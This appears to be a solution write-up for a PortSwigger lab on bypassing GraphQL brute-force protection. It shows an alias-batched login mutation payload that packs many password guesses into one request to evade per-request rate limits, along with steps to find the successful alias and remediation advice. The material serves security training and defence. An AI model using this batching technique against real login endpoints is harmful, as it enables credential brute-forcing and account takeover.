# Lab: Bypassing GraphQL Brute Force Protections

**Category:** GraphQL API Vulnerabilities
**Difficulty:** Practitioner
**Lab link:** [Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

## Overview

The login endpoint has rate limiting that blocks repeated failed attempts. GraphQL **aliases** allow multiple operations to be sent in a single request under different names. Since rate limiting checks per-request rather than per-alias, batching hundreds of login attempts as aliases in one query bypasses the protection entirely.

## Key Concepts

- **GraphQL aliases:** Allow the same field/mutation to be called multiple times in one request with different arguments, each result labelled by its alias name.
- **Rate limiting bypass:** Per-request limits don't account for the fact that one GraphQL request can contain hundreds of distinct operations via aliases.
- **Password list enumeration:** Standard candidate password lists can be encoded as aliases and sent in a single HTTP request.

## Exploit Flow

### Step 1 — Intercept the login mutation

```json
{
  "query": "mutation login($input: LoginInput!) { login(input: $input) { token success } }",
  "variables": {"input": {"username": "carlos", "password": "test"}}
}
```

### Step 2 — Build an alias-batched payload

Replace the single mutation with one alias per password candidate:
```graphql
mutation {
  attempt0: login(input: {username: "carlos", password: "123456"}) { token success }
  attempt1: login(input: {username: "carlos", password: "password"}) { token success }
  attempt2: login(input: {username: "carlos", password: "qwerty"}) { token success }
  ...
}
```

### Step 3 — Send the batched request and find the hit

Search the response for `"success":true`. The alias name (e.g. `attempt42`) identifies which password worked — count from the list (attempt0 = first password, attempt42 = 43rd).

### Step 4 — Log in as carlos

Use the discovered password to log in and solve the lab.

## Generating the Payload

Use the included `solve.py` to generate the full alias payload from the PortSwigger candidate password list.

## Remediation

- Apply rate limiting per **user** or **IP** across all GraphQL operations in a request, not just per HTTP request.
- Implement query complexity limits to prevent excessively large batched requests.
- Use query depth and alias count limits in the GraphQL server configuration.
- Consider disabling or throttling batched queries entirely.

## Key Takeaways

- One HTTP request ≠ one operation in GraphQL — rate limiting must account for aliased batching.
- GraphQL's flexibility is a double-edged sword: the same feature that enables efficient APIs enables brute force bypass.
- Always test login endpoints with batched alias mutations when GraphQL is in use.
